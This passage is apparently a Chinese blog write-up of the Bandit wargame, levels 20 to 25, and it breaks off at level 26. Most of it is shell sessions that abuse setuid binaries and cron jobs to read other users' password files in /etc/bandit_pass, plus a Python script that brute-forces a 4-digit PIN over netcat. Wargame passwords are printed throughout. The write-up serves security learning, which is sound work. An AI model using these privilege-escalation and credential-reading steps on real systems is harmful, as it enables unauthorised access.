class="line"><span class="string">__JCR_END__</span></span><br><span class="line"><span class="string">__init_array_end</span></span><br><span class="line"><span class="string">_DYNAMIC</span></span><br><span class="line"><span class="string">__init_array_start</span></span><br><span class="line"><span class="string">__GNU_EH_FRAME_HDR</span></span><br><span class="line"><span class="string">_GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"><span class="string">__libc_csu_fini</span></span><br><span class="line"><span class="string">__x86.get_pc_thunk.bx</span></span><br><span class="line"><span class="string">printf@@GLIBC_2.0</span></span><br><span class="line"><span class="string">_edata</span></span><br><span class="line"><span class="string">__data_start</span></span><br><span class="line"><span class="string">__gmon_start__</span></span><br><span class="line"><span class="string">exit@@GLIBC_2.0</span></span><br><span class="line"><span class="string">__dso_handle</span></span><br><span class="line"><span class="string">_IO_stdin_used</span></span><br><span class="line"><span class="string">__libc_start_main@@GLIBC_2.0</span></span><br><span class="line"><span class="string">execv@@GLIBC_2.0</span></span><br><span class="line"><span class="string">__libc_csu_init</span></span><br><span class="line"><span class="string">_fp_hw</span></span><br><span class="line"><span class="string">__bss_start</span></span><br><span class="line"><span class="string">main</span></span><br><span class="line"><span class="string">__TMC_END__</span></span><br><span class="line"><span class="string">.symtab</span></span><br><span class="line"><span class="string">.strtab</span></span><br><span class="line"><span class="string">.shstrtab</span></span><br><span class="line"><span class="string">.interp</span></span><br><span class="line"><span class="string">.note.ABI-tag</span></span><br><span class="line"><span class="string">.note.gnu.build-id</span></span><br><span class="line"><span class="string">.gnu.hash</span></span><br><span class="line"><span class="string">.dynsym</span></span><br><span class="line"><span class="string">.dynstr</span></span><br><span class="line"><span class="string">.gnu.version</span></span><br><span class="line"><span class="string">.gnu.version_r</span></span><br><span class="line"><span class="string">.rel.dyn</span></span><br><span class="line"><span class="string">.rel.plt</span></span><br><span class="line"><span class="string">.init</span></span><br><span class="line"><span class="string">.plt.got</span></span><br><span class="line"><span class="string">.text</span></span><br><span class="line"><span class="string">.fini</span></span><br><span class="line"><span class="string">.rodata</span></span><br><span class="line"><span class="string">.eh_frame_hdr</span></span><br><span class="line"><span class="string">.eh_frame</span></span><br><span class="line"><span class="string">.init_array</span></span><br><span class="line"><span class="string">.fini_array</span></span><br><span class="line"><span class="string">.jcr</span></span><br><span class="line"><span class="string">.dynamic</span></span><br><span class="line"><span class="string">.got.plt</span></span><br><span class="line"><span class="string">.data</span></span><br><span class="line"><span class="string">.bss</span></span><br><span class="line"><span class="string">.comment</span></span><br><span class="line"><span class="string">bandit19@bandit:~$ ./bandit20-do </span></span><br><span class="line"><span class="string">Run a command as another user.</span></span><br><span class="line"><span class="string">  Example: ./bandit20-do id</span></span><br><span class="line"><span class="string">bandit19@bandit:~$ ./bandit20-do  id</span></span><br><span class="line"><span class="string">uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)</span></span><br><span class="line"><span class="string">bandit19@bandit:~$ ls -al</span></span><br><span class="line"><span class="string">total 28</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root     root     4096 Oct 16  2018 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..</span></span><br><span class="line"><span class="string">-rwsr-x---  1 bandit20 bandit19 7296 Oct 16  2018 bandit20-do</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root      675 May 15  2017 .profile</span></span><br><span class="line"><span class="string">bandit19@bandit:~$ ./bandit20-do whoami</span></span><br><span class="line"><span class="string">bandit20</span></span><br><span class="line"><span class="string">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20</span></span><br><span class="line"><span class="string">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span></span><br><span class="line"><span class="string">bandit19@bandit:~$</span></span><br></pre></td></tr></table></figure><p>这一关涉及到的是linux权限的相关知识。/etc/bandit_pass/bandit20的所有者为bandit20，而其权限设置使得只有自身和bandit20这个group的成员能够读取。</p><p>setuid这个文件的拥有者为bandit20，而bandit19，也就是当前登录用户有执行的权限。而该文件有s权限，即setuid权限。能够在程序中调用setuid()系统调用，将自身的suid改成与euid相同，也就是在运行中作为bandit20执行命令。</p><p>对于手头的这个文件，只要将欲执行的命令作为参数传入即可。</p><p>这样的文件如果能够通过一定方式执行命令甚至于获得shell，是渗透人员理想的提权途径。</p><h3 id="level-21"><a href="#level-21" class="headerlink" title="level 21"></a>level 21</h3><p>题目的意思是有一个setuid的执行文件，他会和localhost的给定端口建立连接，然后他会从连接中读取一行信息，将其和前一关的flag对比，正确就会返回flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bandit20@bandit:~$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x  2 root     root      4096 Oct 16  2018 .</span><br><span class="line">drwxr-xr-x 41 root     root      4096 Oct 16  2018 ..</span><br><span class="line">-rw-r--r--  1 root     root       220 May 15  2017 .bash_logout</span><br><span class="line">-rw-r--r--  1 root     root      3526 May 15  2017 .bashrc</span><br><span class="line">-rw-r--r--  1 root     root       675 May 15  2017 .profile</span><br><span class="line">-rwsr-x---  1 bandit21 bandit20 12088 Oct 16  2018 suconnect</span><br><span class="line">bandit20@bandit:~$ ./suconnect </span><br><span class="line">Usage: ./suconnect &lt;portnumber&gt;</span><br><span class="line">This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.</span><br><span class="line">bandit20@bandit:~$ nc -lp 2333 &lt; /etc/bandit_pass/bandit20</span><br><span class="line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span><br><span class="line">bandit20@bandit:~$</span><br></pre></td></tr></table></figure><p>利用nc监听端口即可做到</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bandit20@bandit:~$ </span><br><span class="line">bandit20@bandit:~$ ls</span><br><span class="line">suconnect</span><br><span class="line">bandit20@bandit:~$ ./suconnect 2333</span><br><span class="line">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br><span class="line">Password matches, sending next password</span><br><span class="line">bandit20@bandit:~$</span><br></pre></td></tr></table></figure><h3 id="level-22"><a href="#level-22" class="headerlink" title="level 22"></a>level 22</h3><p>这关原以为是让了解crontab的用法，没想到看执行文件干了什么就得到了flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bandit21@bandit:~$ cat /etc/bandit_pass/bandit21</span><br><span class="line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span><br><span class="line">bandit21@bandit:~$ ls /etc/cron.d/</span><br><span class="line">atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24</span><br><span class="line">bandit21@bandit:~$ cat /etc/cron.d/atop</span><br><span class="line">PATH=/bin:/usr/bin:/sbin:/usr/sbin</span><br><span class="line"></span><br><span class="line"><span class="comment"># daily restart of atop at midnight</span></span><br><span class="line">0 0 * * * root <span class="keyword">if</span> [ -d <span class="string">"/run/systemd/system"</span> ]; <span class="keyword">then</span> systemctl restart atop; <span class="keyword">else</span> /usr/share/atop/atop.daily \&amp; ; <span class="keyword">fi</span></span><br><span class="line">bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22</span><br><span class="line">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">bandit21@bandit:~$ cat /usr/bin/cronjob_bandit23.sh </span><br><span class="line">cat: /usr/bin/cronjob_bandit23.sh: Permission denied</span><br><span class="line">bandit21@bandit:~$ crontab -l</span><br><span class="line">crontabs/bandit21/: fopen: Permission denied</span><br><span class="line">bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure><h3 id="level-23"><a href="#level-23" class="headerlink" title="level 23"></a>level 23</h3><blockquote><p><a href="https://www.linuxidc.com/Linux/2019-03/157335.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2019-03/157335.htm</a></p><p>其他的：</p><p><a href="https://blog.csdn.net/long2746004900/article/details/53367353" target="_blank" rel="noopener">https://blog.csdn.net/long2746004900/article/details/53367353</a></p><p><a href="https://blog.csdn.net/zhongqi2513/article/details/78613768" target="_blank" rel="noopener">https://blog.csdn.net/zhongqi2513/article/details/78613768</a></p></blockquote><p>这关的核心还是阅读shell文件</p><p>题目也十分温馨的提醒了，若是不懂可以运行运行debug</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">bandit22@bandit:~$ ls /etc/cron.d</span><br><span class="line">atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24</span><br><span class="line">bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23</span><br><span class="line">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">bandit22@bandit:~$ cat /usr/bin/cron</span><br><span class="line">cronjob_bandit22.sh  cronjob_bandit24.sh  </span><br><span class="line">cronjob_bandit23.sh  crontab              </span><br><span class="line">bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line">mytarget=$(<span class="built_in">echo</span> I am user <span class="variable">$myname</span> | md5sum | cut -d <span class="string">' '</span> -f 1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Copying passwordfile /etc/bandit_pass/<span class="variable">$myname</span> to /tmp/<span class="variable">$mytarget</span>"</span></span><br><span class="line"></span><br><span class="line">cat /etc/bandit_pass/<span class="variable">$myname</span> &gt; /tmp/<span class="variable">$mytarget</span></span><br><span class="line">bandit22@bandit:~$ <span class="built_in">echo</span> I am user <span class="variable">$myname</span> | md5sum | cut -d <span class="string">' '</span> -f 1</span><br><span class="line">7db97df393f40ad1691b6e1fb03d53eb</span><br><span class="line">bandit22@bandit:~$ cat /tmp/7db97df393f40ad1691b6e1fb03d53eb</span><br><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br><span class="line">bandit22@bandit:~$ whoami</span><br><span class="line">bandit22</span><br><span class="line">bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh </span><br><span class="line">Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3</span><br><span class="line">bandit22@bandit:~$ ls -al /usr/bin/cronjob_bandit23.sh</span><br><span class="line">-rwxr-x--- 1 bandit23 bandit22 211 Oct 16  2018 /usr/bin/cronjob_bandit23.sh</span><br><span class="line">bandit22@bandit:~$ <span class="built_in">echo</span> I am user bandit23 | md5sum | cut -d <span class="string">' '</span> -f 1</span><br><span class="line">8ca319486bfbbc3663ea0fbe81326349</span><br><span class="line">bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349</span><br><span class="line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span><br><span class="line">bandit22@bandit:~$</span><br></pre></td></tr></table></figure><p>但是这里有个坑，忽然发现得到的flag和上次一样，注意到该sh是bandit23所执行的，属于bandit22组，所以用户名应该是bandit23</p><p>最后查询的flag进入下一关</p><h3 id="level-24"><a href="#level-24" class="headerlink" title="level 24"></a>level 24</h3><p>老套路，打开sh阅读源码</p><p>这是一个能运行并删除某个文件夹里所有脚本文件的脚本（这里用到timeout去执行任何文件</p><p>所以我们需要自己写一个脚本去获取密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 </span><br><span class="line">@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span><br><span class="line">bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/spool/<span class="variable">$myname</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Executing and deleting all scripts in /var/spool/<span class="variable">$myname</span>:"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> * .*;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$i</span>"</span> != <span class="string">"."</span> -a <span class="string">"<span class="variable">$i</span>"</span> != <span class="string">".."</span> ];</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">4<span class="built_in">echo</span> <span class="string">"Handling <span class="variable">$i</span>"</span></span><br><span class="line">4timeout -s 9 60 ./<span class="variable">$i</span></span><br><span class="line">4rm -f ./<span class="variable">$i</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bandit23@bandit:~$ ls -al /usr/bin/cronjob_bandit24.sh</span><br><span class="line">-rwxr-x--- 1 bandit24 bandit23 253 Oct 16  2018 /usr/bin/cronjob_bandit24.sh</span><br><span class="line">bandit23@bandit:~$ ls /var/spool/bandit24</span><br><span class="line">ls: cannot open directory <span class="string">'/var/spool/bandit24'</span>: Permission denied</span><br><span class="line">bandit23@bandit:~$ ls /var/spool/</span><br><span class="line">bandit24  cron  mail  rsyslog</span><br><span class="line">bandit23@bandit:~$ ls /var/spool/ -al</span><br><span class="line">total 1348</span><br><span class="line">drwxr-xr-x  5 root root        4096 Oct 16  2018 .</span><br><span class="line">drwxr-xr-x 11 root root        4096 Oct 16  2018 ..</span><br><span class="line">drwxrwx-wx 37 root bandit24 1359872 Feb 16 10:41 bandit24</span><br><span class="line">drwxr-xr-x  3 root root        4096 Oct 16  2018 cron</span><br><span class="line">lrwxrwxrwx  1 root root           7 Oct 16  2018 mail -&gt; ../mail</span><br><span class="line">drwx------  2 root root        4096 Jan 14  2018 rsyslog</span><br><span class="line">bandit23@bandit:~$ ls</span><br><span class="line">bandit23@bandit:~$ touch fuck.sh</span><br><span class="line">touch: cannot touch <span class="string">'fuck.sh'</span>: Permission denied</span><br><span class="line">bandit23@bandit:~$ touch /tmp/bandit23/fuck.sh</span><br><span class="line">bandit23@bandit:~$ ls -al  /tmp/bandit23/</span><br><span class="line">total 305956</span><br><span class="line">drwxrwxrwx 7 bandit23 root          4096 Feb 16 10:56 .</span><br><span class="line">drwxrws-wt 1 root     root     313204736 Feb 16 10:57 ..</span><br><span class="line">-rw-r--r-- 1 bandit23 bandit23         0 Feb 16 10:56 fuck.sh</span><br><span class="line">-rw-r--r-- 1 bandit24 bandit24         1 Feb 14 16:05 out</span><br><span class="line">-rw-r--r-- 1 bandit24 bandit24         0 Feb 14 16:49 output</span><br><span class="line">-rw-r--r-- 1 bandit24 bandit24        66 Feb 14 20:48 pass</span><br><span class="line">drwxr-xr-x 3 bandit27 bandit27      4096 Feb  7 13:12 repo</span><br><span class="line">drwxr-xr-x 3 bandit28 bandit28      4096 Feb  7 13:21 repo28</span><br><span class="line">drwxr-xr-x 4 bandit29 bandit29      4096 Feb  7 13:28 repo29</span><br><span class="line">drwxr-xr-x 3 bandit30 bandit30      4096 Feb  7 13:29 repo30</span><br><span class="line">drwxr-xr-x 3 bandit31 bandit31      4096 Feb  7 13:55 repo31</span><br><span class="line">-rwxrwxrwx 1 bandit23 bandit23        99 Feb 15 17:49 shell.sh</span><br><span class="line">bandit23@bandit:~$ vim /tmp/bandit23/fuck.sh</span><br><span class="line">bandit23@bandit:/tmp/bandit23$ cat fuck.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/bandit23/bandit23_pass</span><br><span class="line"></span><br><span class="line">bandit23@bandit:~$ chmod +x /tmp/bandit23/fuck.sh</span><br><span class="line">bandit23@bandit:~$ </span><br><span class="line">bandit23@bandit:~$ <span class="built_in">cd</span> /tmp/bandit23</span><br><span class="line">bandit23@bandit:/tmp/bandit23$ ls</span><br><span class="line">fuck.sh  out  output  pass  repo  repo28  repo29  repo30  repo31  shell.sh</span><br><span class="line">bandit23@bandit:/tmp/bandit23$ cp fuck.sh /var/spool/bandit24/fuck.sh</span><br><span class="line">bandit23@bandit:/tmp/bandit23$ ls</span><br><span class="line">fuck.sh  out  output  pass  repo  repo28  repo29  repo30  repo31  shell.sh</span><br><span class="line">bandit23@bandit:/tmp/bandit23$ ls</span><br><span class="line">fuck.sh  out  output  pass  repo  repo28  repo29  repo30  repo31  shell.sh</span><br><span class="line">bandit23@bandit:/tmp/bandit23$ ls</span><br><span class="line">fuck.sh  out  output  pass  repo  repo28  repo29  repo30  repo31  shell.sh</span><br><span class="line">bandit23@bandit:/tmp/bandit23$ ls</span><br><span class="line">bandit23_pass  out     pass  repo28  repo30  shell.sh</span><br><span class="line">fuck.sh        output  repo  repo29  repo31</span><br><span class="line">bandit23@bandit:/tmp/bandit23$ cat bandit23_pass</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br><span class="line">bandit23@bandit:/tmp/bandit23$</span><br></pre></td></tr></table></figure><h3 id="level-25"><a href="#level-25" class="headerlink" title="level 25"></a>level 25</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">bandit24@bandit:~$ telnet localhost 30002</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to localhost.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">I am the pincode checker <span class="keyword">for</span> user bandit25. Please enter the password <span class="keyword">for</span> user bandit24 and the secret pincode on a single line, separated by a space.</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1</span><br><span class="line">Timeout. Exiting.</span><br><span class="line">Connection closed by foreign host.</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ nc localhost 30002</span><br><span class="line">I am the pincode checker <span class="keyword">for</span> user bandit25. Please enter the password <span class="keyword">for</span> user bandit24 and the secret pincode on a single line, separated by a space.</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5201</span><br><span class="line">Wrong! Please enter the correct pincode. Try again.</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1213</span><br><span class="line">Wrong! Please enter the correct pincode. Try again.</span><br><span class="line">^C</span><br><span class="line">bandit24@bandit:~$ <span class="built_in">cd</span> /tmp/bandit24</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ ls</span><br><span class="line">bandit24.sh   counters.txt  pass          pin_mod.py  pktempdir  tcol</span><br><span class="line">bandit25.sh   getpass.sh    pass24.sh     pin.py      qsd.txt    test.txt</span><br><span class="line">bash_file.sh  mine.sh       password.txt  pins        script.sh  wesh.sh</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br><span class="line">-bash: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ: <span class="built_in">command</span> not found</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ nc localhost 30002 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br><span class="line">I am the pincode checker <span class="keyword">for</span> user bandit25. Please enter the password <span class="keyword">for</span> user bandit24 and the secret pincode on a single line, separated by a space.</span><br><span class="line"> </span><br><span class="line">Fail! You did not supply enough data. Try again.</span><br><span class="line"></span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ ls</span><br><span class="line">bandit24.sh   fuck24.sh   pass24.sh     pins       tcol</span><br><span class="line">bandit25.sh   getpass.sh  password.txt  pktempdir  test.txt</span><br><span class="line">bash_file.sh  mine.sh     pin_mod.py    qsd.txt    wesh.sh</span><br><span class="line">counters.txt  pass        pin.py        script.sh</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ python</span><br><span class="line">Python 2.7.13 (default, Sep 26 2018, 18:42:22) </span><br><span class="line">[GCC 6.3.0 20170516] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span>()</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ touch fuck24.py</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ vim fuck24.py</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ touch pass24</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ cat fuck24.py</span><br><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'pass24'</span>,<span class="string">'w'</span>)</span><br><span class="line">passwd = <span class="string">'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10000):</span><br><span class="line">    flag = passwd + <span class="string">' '</span> + str(i).zfill(4) + <span class="string">'\n'</span></span><br><span class="line">    f.write(flag)</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">bandit24@bandit:/tmp/bandit24$ python fuck24.py</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ less pass24</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ nc localhost 30002 &lt; pass24 &gt; ans.txt</span><br><span class="line">bandit24@bandit:/tmp/bandit24$ sort ans.txt | uniq -u</span><br><span class="line"></span><br><span class="line">Correct!</span><br><span class="line">Exiting.</span><br><span class="line">I am the pincode checker <span class="keyword">for</span> user bandit25. Please enter the password <span class="keyword">for</span> user bandit24 and the secret pincode on a single line, separated by a space.</span><br><span class="line">The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</span><br><span class="line">bandit24@bandit:/tmp/bandit24$</span><br></pre></td></tr></table></figure><p>简单来说，有一个程序在监听30002端口，接收<code>$bandit24_pass pin</code>，需要我们爆破pin</p><p>这边利用python生成<code>pass24</code>字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'pass24'</span>,<span class="string">'w'</span>)</span><br><span class="line">passwd = <span class="string">'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    flag = passwd + <span class="string">' '</span> + str(i).zfill(<span class="number">4</span>) + <span class="string">'\n'</span></span><br><span class="line">    f.write(flag)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后通过<code>nc localhost 30002 &lt; pass24 &gt; ans.txt</code>命令将其传给守护程序，返回结果存入ans.txt</p><p>然后再ans.txt中找出不一样的即可</p><p>//TODO：后续想用单纯的shell脚本跑一波</p><h3 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 